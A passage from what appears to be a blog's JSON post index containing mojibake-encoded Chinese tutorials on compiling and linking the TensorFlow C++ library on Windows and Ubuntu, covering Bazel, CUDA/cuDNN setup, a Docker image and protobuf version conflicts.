https://github.com/fo40225/tensorflow-windows-wheel æ³¨æ„: è¿™é‡Œé¢åªæœ‰tensorflow1.71.10çš„ç‰ˆæœ¬æœ‰ç¼–è¯‘å¥½çš„cppåº“ï¼Œå…¶ä»–çš„ç‰ˆæœ¬åªæœ‰ç¼–è¯‘å¥½çš„å®‰è£…tfçš„pythonåº“çš„whlæ–‡ä»¶ï¼Œæ‰€ä»¥å¼ºçƒˆæ¨èå¤§å®¶ç”¨1.71.10çš„tensorflowã€‚ ä¾‹å¦‚æˆ‘éœ€è¦tensorflow1.10çš„ã€cpuæ”¯æŒAVX2æŒ‡ä»¤é›†çš„ç‰ˆæœ¬ï¼Œå°±ä¸‹è½½tensorflow-windows-wheel/1.10.0/cpp/libtensorflow-cpu-windows-x86_64-1.10.0-avx2.7z ä¾‹å¦‚æˆ‘éœ€è¦tensorflow1.10çš„ã€cpuæ”¯æŒSSE2æŒ‡ä»¤é›†ã€ä¸”gpuæ”¯æŒCUDA9.2å’ŒCUDNN7.2çš„ç‰ˆæœ¬ï¼Œå°±ä¸‹è½½tensorflow-windows-wheel/1.10.0/cpp/libtensorflow-gpu-windows-x86_64-1.10.0-sse2cuda92cudnn72.7z ç„¶åæŠŠå…¶ä¸­çš„includeè·¯å¾„åŒ…å«è¿›å»ï¼ŒæŠŠlibæ–‡ä»¶æ·»åŠ åˆ°å·¥ç¨‹ä¸­ï¼Œå†åœ¨æ‰§è¡Œexeæ—¶æŠŠdllæ–‡ä»¶å¤åˆ¶è¿›å»å°±å¥½äº† â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œ_æ²¥å·å¾€äº‹ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/yuejisuo1948/article/details/84197534 å¼•å…¥tensorflow åœ¨cmakelist.txtä¸­å†™å…¥ï¼› include_directories(&lt;Your Path&gt;&#x2F;tensorflow&#x2F;include) link_directories(&lt;Your Path&gt;&#x2F;tensorflow&#x2F;lib) target_link_libraries(&lt;Your exe name&gt; tensorflow) é‡åˆ°çš„é—®é¢˜: 1. â€œ(â€:â€œ::â€å³è¾¹çš„éæ³•æ ‡è®°åº”è¾“å…¥æ ‡è®°ç¬¦ åŸå› å¤„åœ¨vcå’Œc++æ¨¡æ¿åº“ä¸Š.minå’Œmaxä¸&lt;windows.h&gt;ä¸­ä¼ ç»Ÿçš„min/maxå®å®šä¹‰æœ‰å†²çª åœ¨å±æ€§-&gt;C/C+Â±&gt;é¢„å¤„ç†å™¨-&gt; é¢„å¤„ç†å®šä¹‰ä¸­ æ·»åŠ NOMINMAX è§£å†³æ–¹æ³•: 2.æ‰¾ä¸åˆ°tensorflow.dll è§£å†³æ–¹æ³•: ==å°†å·²ç¼–è¯‘å¥½çš„tensorflowçš„binç›®å½•ä¸‹ tensorflow.dll å¤åˆ¶åˆ° debugç›®å½•ä¸‹å’Œ*.exeä¸€èµ·== å¦‚å›¾: 3.æ‰¾ä¸åˆ°cublas64_92.dll æ²¡å®‰è£…cudaçš„ç¼˜æ•… æˆ‘å¯¹åº”çš„æ˜¯å®‰è£…9.2çš„ç‰ˆæœ¬ å‚è€ƒå®‰è£…CUDAæ–‡ç«  https://blog.csdn.net/qq_46126258/article/details/112739305?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=94a15f6a-35fe-4639-90bf-20c5530f2251&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control å®‰è£…å®Œåå†è¿è¡Œæç¤º æ‰¾ä¸åˆ° cudnn64_7.dll æ²¡æœ‰å®‰è£…å¯¹åº”çš„cudnnç‰ˆæœ¬ å»nvidiaå®˜ç½‘å®‰è£… https://developer.nvidia.com/rdp/cudnn-archive é€‰æ‹©å¯¹åº”çš„Cudaç‰ˆæœ¬ ï¼Œ è¿™é‡Œé€‰æ‹©çš„å°±æ˜¯ ä¸‹è½½å å°†å¯¹åº”çš„æ–‡ä»¶å¤åˆ¶åˆ° CUDA çš„å®‰è£…ç›®å½•ï¼š a) Copy &lt;installpath>\\cuda\\bin\\cudnn64_7.dll to C:\\Program Files \\NVIDIA GPU Computing Toolkit\\CUDA\\v9.2\\bin. b) Copy &lt;installpath>\\cuda\\ include\\cudnn.h to C:\\Program Files \\NVIDIA GPU Computing Toolkit\\CUDA\\v9.2\\include. c) Copy &lt;installpath>\\cuda\\lib\\x64\\cudnn.lib to C:\\Program Files \\NVIDIA GPU Computing Toolkit\\CUDA\\v9.2\\lib\\x64","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"VS2019","slug":"æŠ€æœ¯å‘/VS2019","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/VS2019/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"},{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"VS2019","slug":"VS2019","permalink":"https://www.sizaif.com/tags/VS2019/"}],"author":"sizaif"},{"title":"Ubuntu 20.04LTS ç¼–è¯‘Tensorflow C++","slug":"ubuntu-20-04LTS-ç¼–è¯‘tensorflow-C","date":"2021-08-11T01:23:22.000Z","updated":"2021-08-14T14:15:24.000Z","comments":true,"path":"posts/71bba0f8/","link":"","permalink":"https://www.sizaif.com/posts/71bba0f8/","excerpt":"","text":"ubuntu 20.04LTS ç¼–è¯‘tensorflow C++ NOTE! å› ä¸ºubuntuåœ¨è™šæ‹Ÿæœºé‡Œ,æˆ‘æ˜¯ç”¨çš„ç¬”è®°æœ¬çš„æ˜¾å¡æ¯”è¾ƒè½å,å®‰è£…NVIDIAé©±åŠ¨å¤±è´¥,æ•…æœªä½¿ç”¨ GPUåŠŸèƒ½,ä»…ä½¿ç”¨äº†CPUæ¨¡å¼; ç¼–è¯‘å¾—åˆ°libtensorflow_cc.soå’Œlibtensorflow_framework.so æ˜¯C++ æ‰€éœ€è¦çš„ [TOC] tensorflow å’ŒBazel ä»¥åŠpython å¯¹åº”çš„ç‰ˆæœ¬ Linux CPU CPU VersionPython versionCompilerBuild toolstensorflow-2.4.03.6-3.8GCC 7.3.1Bazel 3.1.0tensorflow-2.3.03.5-3.8GCC 7.3.1Bazel 3.1.0tensorflow-2.2.03.5-3.8GCC 7.3.1Bazel 2.0.0tensorflow-2.1.02.7, 3.5-3.7GCC 7.3.1Bazel 0.27.1tensorflow-2.0.02.7, 3.3-3.7GCC 7.3.1Bazel 0.26.1tensorflow-1.15.02.7, 3.3-3.7GCC 7.3.1Bazel 0.26.1tensorflow-1.14.02.7, 3.3-3.7GCC 4.8Bazel 0.24.1tensorflow-1.13.12.7, 3.3-3.7GCC 4.8Bazel 0.19.2tensorflow-1.12.02.7, 3.3-3.6GCC 4.8Bazel 0.15.0tensorflow-1.11.02.7, 3.3-3.6GCC 4.8Bazel 0.15.0tensorflow-1.10.02.7, 3.3-3.6GCC 4.8Bazel 0.15.0tensorflow-1.9.02.7, 3.3-3.6GCC 4.8Bazel 0.11.0tensorflow-1.8.02.7, 3.3-3.6GCC 4.8Bazel 0.10.0tensorflow-1.7.02.7, 3.3-3.6GCC 4.8Bazel 0.10.0tensorflow-1.6.02.7, 3.3-3.6GCC 4.8Bazel 0.9.0tensorflow-1.5.02.7, 3.3-3.6GCC 4.8Bazel 0.8.0tensorflow-1.4.02.7, 3.3-3.6GCC 4.8Bazel 0.5.4tensorflow-1.3.02.7, 3.3-3.6GCC 4.8Bazel 0.4.5tensorflow-1.2.02.7, 3.3-3.6GCC 4.8Bazel 0.4.5tensorflow-1.1.02.7, 3.3-3.6GCC 4.8Bazel 0.4.2tensorflow-1.0.02.7, 3.3-3.6GCC 4.8Bazel 0.4.2 GPU GPU VersionPython versionCompilerBuild toolscuDNNCUDAtensorflow-2.4.03.6-3.8GCC 7.3.1Bazel 3.1.08.011.0tensorflow-2.3.03.5-3.8GCC 7.3.1Bazel 3.1.07.610.1tensorflow-2.2.03.5-3.8GCC 7.3.1Bazel 2.0.07.610.1tensorflow-2.1.02.7, 3.5-3.7GCC 7.3.1Bazel 0.27.17.610.1tensorflow-2.0.02.7, 3.3-3.7GCC 7.3.1Bazel 0.26.17.410.0tensorflow_gpu-1.15.02.7, 3.3-3.7GCC 7.3.1Bazel 0.26.17.410.0tensorflow_gpu-1.14.02.7, 3.3-3.7GCC 4.8Bazel 0.24.17.410.0tensorflow_gpu-1.13.12.7, 3.3-3.7GCC 4.8Bazel 0.19.27.410.0tensorflow_gpu-1.12.02.7, 3.3-3.6GCC 4.8Bazel 0.15.079tensorflow_gpu-1.11.02.7, 3.3-3.6GCC 4.8Bazel 0.15.079tensorflow_gpu-1.10.02.7, 3.3-3.6GCC 4.8Bazel 0.15.079tensorflow_gpu-1.9.02.7, 3.3-3.6GCC 4.8Bazel 0.11.079tensorflow_gpu-1.8.02.7, 3.3-3.6GCC 4.8Bazel 0.10.079tensorflow_gpu-1.7.02.7, 3.3-3.6GCC 4.8Bazel 0.9.079tensorflow_gpu-1.6.02.7, 3.3-3.6GCC 4.8Bazel 0.9.079tensorflow_gpu-1.5.02.7, 3.3-3.6GCC 4.8Bazel 0.8.079tensorflow_gpu-1.4.02.7, 3.3-3.6GCC 4.8Bazel 0.5.468tensorflow_gpu-1.3.02.7, 3.3-3.6GCC 4.8Bazel 0.4.568tensorflow_gpu-1.2.02.7, 3.3-3.6GCC 4.8Bazel 0.4.55.18tensorflow_gpu-1.1.02.7, 3.3-3.6GCC 4.8Bazel 0.4.25.18tensorflow_gpu-1.0.02.7, 3.3-3.6GCC 4.8Bazel 0.4.25.18 å…·ä½“æ­¥éª¤ ä¸€ é¦–å…ˆå®‰è£…python3 ç¯å¢ƒ, å¦‚æœä½ æ²¡æœ‰å®‰è£…çš„è¯ sudo apt install python3-dev python3-pip å®‰è£…TensorFlow 2 .whlåŒ…éœ€è¦ä¸€ä¸ªpipç‰ˆæœ¬&gt;19.0 äºŒ å®‰è£… Bazel è¿™é‡Œæˆ‘æ‰ç”¨çš„æ˜¯å®‰è£…ç¨‹åºæ–‡ä»¶æ¥è¿›è¡Œçš„. å®‰è£…ç¨‹åºå¯ä»¥ä»Bazelâ€™sä¸‹è½½ https://github.com/bazelbuild/bazel/releases é€‰æ‹©ä¸Šé¢ä½ è¦ç¼–è¯‘çš„å¯¹åº”çš„bazelç‰ˆæœ¬ å®‰è£…ç¨‹åºåŒ…å«BazeläºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å°†å…¶æå–åˆ°**$HOME/bin**æ–‡ä»¶å¤¹ä¸­ã€‚ä¸ºäº†è®©Bazelå·¥ä½œï¼Œå¿…é¡»æ‰‹åŠ¨å®‰è£…ä¸€äº›é™„åŠ åº“ã€‚ å¦‚æœæ²¡æœ‰ä»¥ä¸‹ç¯å¢ƒ. éœ€è¦è¿›è¡Œå®‰è£… sudo apt install g++ unzip zip å¦‚æœæƒ³ç”¨Bazel æ„å»ºJAVAä»£ç , ä½¿ç”¨JDK # Ubuntu 16.04 (LTS) uses OpenJDK 8 by default: sudo apt-get install openjdk-8-jdk # Ubuntu 18.04 (LTS) uses OpenJDK 11 by default: sudo apt-get install openjdk-11-jdk ä¸‹è½½ä¹‹å, è¿è¡Œ chmod +x bazel-&lt;version>-installer-linux-x86_64.sh ./bazel-&lt;version>-installer-linux-x86_64.sh --user The --user flag installs Bazel to the $HOME/bin directory on your system and sets the .bazelrc path to $HOME/.bazelrc. Use the --help command to see additional installation options. å½“ä½¿ç”¨â€“user æ¥å®‰è£…æ—¶, Bazel ä¼šè¢«å®‰è£…åˆ° $HOME/bin è·¯å¾„ä¸‹, æ·»åŠ ç¯å¢ƒè¯­å¥åˆ°ç¯å¢ƒ**/.bashrc**æˆ–è€…**/.zshrc**å˜é‡é‡Œ å¯ä»¥ä½¿ç”¨VIM vim ~/.bashrc æ·»åŠ ä»¥ä¸‹è¯­å¥ export PATH=\"$PATH:$HOME/bin\" ç„¶åå®è´¨ç”Ÿæ•ˆ source ~/.bashrc ä¸‰ä¸‹è½½tensorflowæºç  git clone https://github.com/tensorflow/tensorflow.git cd tensorflow é€‰æ‹©è¦å®‰è£…çš„ç‰ˆæœ¬ git checkout branch_name # r2.2, r2.3, r2.4 etc. æ„å»ºç¯å¢ƒ ./configure configure ä¼šè¯å±•ç¤º è¿™é‡Œè¦è¯´æ˜çš„æ˜¯å¦‚æœæœ‰CUDAï¼Œé‚£ä¹ˆDo you wish to build Tensorflow with CUDA?ä¸€å®šè¦é€‰Yï¼Œç„¶åå…¶å®ƒçš„æˆ‘åŸºæœ¬éƒ½æ˜¯N code ./configure You have bazel 3.0.0 installed. Please specify the location of python. [Default is /usr/bin/python3]: Found possible Python library paths: /usr/lib/python3/dist-packages /usr/local/lib/python3.6/dist-packages Please input the desired Python library path to use. Default is [/usr/lib/python3/dist-packages] Do you wish to build TensorFlow with OpenCL SYCL support? [y/N]: No OpenCL SYCL support will be enabled for TensorFlow. Do you wish to build TensorFlow with ROCm support? [y/N]: No ROCm support will be enabled for TensorFlow. Do you wish to build TensorFlow with CUDA support? [y/N]: Y CUDA support will be enabled for TensorFlow. Do you wish to build TensorFlow with TensorRT support? [y/N]: No TensorRT support will be enabled for TensorFlow. Found CUDA 10.1 in: /usr/local/cuda-10.1/targets/x86_64-linux/lib /usr/local/cuda-10.1/targets/x86_64-linux/include Found cuDNN 7 in: /usr/lib/x86_64-linux-gnu /usr/include Please specify a list of comma-separated CUDA compute capabilities you want to build with. You can find the compute capability of your device at: https://developer.nvidia.com/cuda-gpus Each capability can be specified as \"x.y\" or \"compute_xy\" to include both virtual and binary GPU code, or as \"sm_xy\" to only include the binary code. Please note that each additional compute capability significantly increases your build time and binary size, and that TensorFlow only supports compute capabilities >= 3.5 [Default is: 3.5,7.0]: 6.1 Do you want to use clang as CUDA compiler? [y/N]: nvcc will be used as CUDA compiler. Please specify which gcc should be used by nvcc as the host compiler. [Default is /usr/bin/gcc]: Please specify optimization flags to use during compilation when bazel option \"--config=opt\" is specified [Default is -march=native -Wno-sign-compare]: Would you like to interactively configure ./WORKSPACE for Android builds? [y/N]: Not configuring the WORKSPACE for Android builds. Preconfigured Bazel build configs. You can use any of the below by adding \"--config=&lt;>\" to your build command. See .bazelrc for more details. --config=mkl # Build with MKL support. --config=monolithic # Config for mostly static monolithic build. --config=ngraph # Build with Intel nGraph support. --config=numa # Build with NUMA support. --config=dynamic_kernels # (Experimental) Build kernels into separate shared objects. --config=v2 # Build TensorFlow 2.x instead of 1.x. Preconfigured Bazel build configs to DISABLE default on features: --config=noaws # Disable AWS S3 filesystem support. --config=nogcp # Disable GCP support. --config=nohdfs # Disable HDFS support. --config=nonccl # Disable NVIDIA NCCL support. Configuration finished ç¼–è¯‘ é…ç½®å¥½ä¹‹åå°±è¿›è¡Œç¼–è¯‘ï¼šè‹¥é‡‡ç”¨CUDA åˆ™å¦‚ä¸‹ bazel build --config=opt --config=cuda //tensorflow:libtensorflow_cc.so â€‹ è¿™é‡Œå¦‚æœä¸ç”¨cudaçš„è¯(å‰é¢é…ç½®çš„æ—¶å€™åœ¨CUDAé‚£ä¸€é¡¹é‚£é‡Œè¾“å…¥N)ï¼Œå°±è¾“å…¥ï¼š bazel build --config=opt //tensorflow:libtensorflow_cc.so å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜: /usr/bin/env: â€˜pythonâ€˜: No such file or directory å¦‚æœä»¥åŠå®‰è£…äº†python3çš„ç‰ˆæœ¬,å¯èƒ½æ˜¯å› ä¸ºæ˜¾ç¤ºçš„æ˜¯python3.X ä½†ç”¨çš„çš„åç§°ä¸ºpython æ‰€ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªè½¯è¿æ¥ whereis python3# å¦‚æœå®‰è£…çš„è¯,é»˜è®¤åœ¨/usr/bin/ç›®å½•ä¸‹sudo ln -s /usr/bin/python3 /usr/bin/python æ¥ä¸‹æ¥å°±æ˜¯æ¼«é•¿çš„ç­‰å¾…, å› ä¸ºæˆ‘æ²¡æœ‰ç”¨CUDA( NVIDIAçš„é©±åŠ¨æ²¡æœ‰å®‰è£…ä¸Š,æ‰€ä»¥ç”¨ä¸äº†GPUåŠ é€Ÿ) è€—æ—¶3+å°æ—¶ æœ€ç»ˆä¼šåœ¨ å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª bazel-bin ç›®å½•ä¸‹ tensorflow é‡Œ æ‰¾åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"},{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"}],"author":"sizaif"},{"title":"Tensorflow-C++ & OpenCV & OpenBlas & Eigen3 & Protobuf ç¯å¢ƒDockeré•œåƒ","slug":"tensorflow-C-OpenCV-OpenBlas-eigen3-protobuf-ç¯å¢ƒdockeré•œåƒ","date":"2021-08-11T01:23:06.000Z","updated":"2021-08-14T14:15:24.000Z","comments":true,"path":"posts/1c98e054/","link":"","permalink":"https://www.sizaif.com/posts/1c98e054/","excerpt":"","text":"tensorflow-C++ &amp; OpenCV &amp; OpenBlas &amp; eigen3 &amp; protobuf ç¯å¢ƒdockeré•œåƒ [toc] ç‰ˆæœ¬ tensorflow 2.4.1 protobuf 3.9.2 opencv 4.5.2 openblas 0.3.13 eigen3 3.3.9 ä½¿ç”¨æ–¹æ³•: code # ä¸‹è½½é•œåƒ docker pull sizaif2000/siz:1.0 # è¿è¡Œå åœ¨ /home/tf_test/ ä¸‹æœ‰ tensorflow æµ‹è¯• -------- docker run -p æœ¬æœºæ˜ å°„ç«¯å£:é•œåƒæ˜ å°„ç«¯å£ -d --name å¯åŠ¨é•œåƒåç§° -e é•œåƒå¯åŠ¨å‚æ•° é•œåƒåç§°:é•œåƒç‰ˆæœ¬å· å‚æ•°é‡Šä¹‰ï¼š -p æœ¬æœºç«¯å£å’Œå®¹å™¨å¯åŠ¨ç«¯å£æ˜ å°„ -d åå°è¿è¡Œ --name å®¹å™¨åç§° -e é•œåƒå¯åŠ¨å‚æ•° ------------------------ tf_test . |-- CMakeLists.txt |-- README.md `-- src `-- main.cpp 1 directory, 3 files ------------------------ cd tf_test cmake. make ./main # if ok, then you can see like this: This is tensorflow test XXXX-XX-XX 03:55:33.709188: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI D eep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations: SSE3 SSE4.1 SSE4.2 AVX AVX2 FMA To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags. OK Session successfully created.","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"OpenCV","slug":"æœºå™¨å­¦ä¹ /OpenCV","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/OpenCV/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.sizaif.com/tags/OpenCV/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"},{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"}],"author":"sizaif"},{"title":"Tensorflow V2.4 C++ ç¼–è¯‘æµ‹è¯•é‡åˆ°çš„é—®é¢˜ä»¥åŠç›¸å…³è§£å†³æ–¹æ³•","slug":"tensorflow-V2-4-C-ç¼–è¯‘æµ‹è¯•é‡åˆ°çš„é—®é¢˜ä»¥åŠç›¸å…³è§£å†³æ–¹æ³•","date":"2021-08-11T01:22:48.000Z","updated":"2021-08-14T14:15:24.000Z","comments":true,"path":"posts/fabe9f4f/","link":"","permalink":"https://www.sizaif.com/posts/fabe9f4f/","excerpt":"","text":"tensorflow V2.4 C++ ç¼–è¯‘æµ‹è¯•é‡åˆ°çš„é—®é¢˜ä»¥åŠç›¸å…³è§£å†³æ–¹æ³• [TOC] fatal error: absl/strings/string_view.h: No such file or directory è§£å†³æ–¹æ³•: å°† https://github.com/abseil/abseil-cpp é¡¹ç›®ä¸­ gitä¸‹æ¥, å°† absl ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ å¤åˆ¶åˆ° tensorflow/ ç›®å½•ä¸‹ /usr/local/include/tf/tensorflow ä¸º tensorflow çš„ å¤´æ–‡ä»¶ä½ç½® git clone https://github.com/abseil/abseil-cpp sudo cp -r ./abseil-cpp/absl /usr/local/include/tf/tensorflow atal error: tensorflow/core/protobuf/error_codes.pb.h: No such file or directory è§£å†³æ–¹æ³• å…ˆæŸ¥çœ‹ tensorflow å¤´æ–‡ä»¶ ç›®å½•ä¸‹ /usr/local/include/tf/tensorflow/core/protobuf/ ä¸‹æœ‰æ— æ­¤æ–‡ä»¶, è‹¥æ— ,åˆ™æœ‰å¯èƒ½åœ¨ bazel-bin/tensorflow/core/protobuf ç›®å½•ä¸‹ # å½“å‰åœ¨tensorflow æºç ç›®å½•ä¸‹ sudo cp -r ./bazel-bin/tensorflow/ /usr/local/indlue/tf/tensorflow","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"}],"tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"},{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"}],"author":"sizaif"},{"title":"Tensorflow ä¸Protobufç‰ˆæœ¬å¯¹åº”é—®é¢˜","slug":"tensorflow-ä¸protobufç‰ˆæœ¬å¯¹åº”é—®é¢˜","date":"2021-08-11T01:22:32.000Z","updated":"2021-08-14T14:15:24.794Z","comments":true,"path":"posts/a689049b/","link":"","permalink":"https://www.sizaif.com/posts/a689049b/","excerpt":"","text":"tensorflow ä¸protobufç‰ˆæœ¬å¯¹åº”é—®é¢˜ [TOC] é—®é¢˜æè¿° æˆ‘åœ¨å‰é¢çš„æ–‡ç« ç¼–è¯‘äº†tensorflow 2.4.1ç‰ˆæœ¬, ç„¶åéšä¹‹åˆæ ¹æ®protobuf githubæ•™ç¨‹å®‰è£…äº†3.15ç‰ˆæœ¬çš„protobuf å½“æˆ‘åœ¨ç¼–è¯‘ä»£ç å¼•å…¥tensorflow æ—¶ æç¤ºå¦‚ä¸‹é”™è¯¯: å½“æˆ‘è¿è¡Œå¦‚ä¸‹å‘½ä»¤; å¾—åˆ°protocçš„ä½ç½®,å’Œç‰ˆæœ¬ä¿¡æ¯ siz@ubuntu:~$ which protoc /usr/local/bin/protoc siz@ubuntu:~$ protoc --version libprotoc 3.15.8 æŸ¥é˜…åšå®¢å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯: (å‚è€ƒé“¾æ¥: https://blog.csdn.net/datase/article/details/82347834) æˆ‘æƒ³æˆ‘é‡åˆ°çš„åº”è¯¥æ˜¯ç¬¬äºŒä¸ªé—®é¢˜: æ‰€ä»¥æˆ‘å»äº†tensorflow github æŸ¥çœ‹äº† workspace.bzl ä¿¡æ¯: å¯¹åº”çš„ protobufçš„ç‰ˆæœ¬ä¸º3.9.2; å°è¯•è§£å†³ å¸è½½ protobuf ==Note! å› ä¸ºä¹‹å‰ç¬¬ä¸€æ¬¡å®‰è£…protobuf é‡‡ç”¨çš„æ˜¯è¦†ç›–å®‰è£…,æ‰€ä»¥å°†Ubuntuè‡ªå¸¦çš„protobufè¦†ç›–æ‰äº†, æ‰€ä»¥æˆ‘é€‰æ‹©ç›´æ¥å¸è½½æ‰æœ€æ–°çš„,é‡æ–°å®‰è£…,æ²¡æœ‰é‡‡ç”¨å…¼å®¹å®‰è£…çš„æ–¹å¼== åˆ é™¤æ–¹å¼, è¿›å…¥åˆ°ä¸‹è½½çš„protobuf è·¯å¾„é‡Œ, é‡‡ç”¨ make uninstall æ–¹å¼ code siz@ubuntu:~/soft$ cd protobuf-3.15.8/ siz@ubuntu:~/soft/protobuf-3.15.8$ sudo make uninstall [sudo] password for siz: Making uninstall in . make[1]: Entering directory '/home/siz/soft/protobuf-3.15.8' ( cd '/usr/local/lib/pkgconfig' &amp;&amp; rm -f protobuf.pc protobuf-lite.pc ) make[1]: Leaving directory '/home/siz/soft/protobuf-3.15.8' Making uninstall in src make[1]: Entering directory '/home/siz/soft/protobuf-3.15.8/src' ( cd '/usr/local/bin' &amp;&amp; rm -f protoc ) /bin/bash ../libtool --mode=uninstall rm -f '/usr/local/lib/libprotobuf-lite.la' libtool: uninstall: rm -f /usr/local/lib/libprotobuf-lite.la /usr/local/lib/libprotobuf-lite.a /bin/bash ../libtool --mode=uninstall rm -f '/usr/local/lib/libprotobuf.la' libtool: uninstall: rm -f /usr/local/lib/libprotobuf.la /usr/local/lib/libprotobuf.a /bin/bash ../libtool --mode=uninstall rm -f '/usr/local/lib/libprotoc.la' libtool: uninstall: rm -f /usr/local/lib/libprotoc.la /usr/local/lib/libprotoc.a ( cd '/usr/local/include' &amp;&amp; rm -f google/protobuf/descriptor.proto google/protobuf/any.proto google/protobuf/api.proto google/protobuf/duration.proto google/protobuf/empty.proto google/protobuf/field_mask.proto google/protobuf/source_context.proto 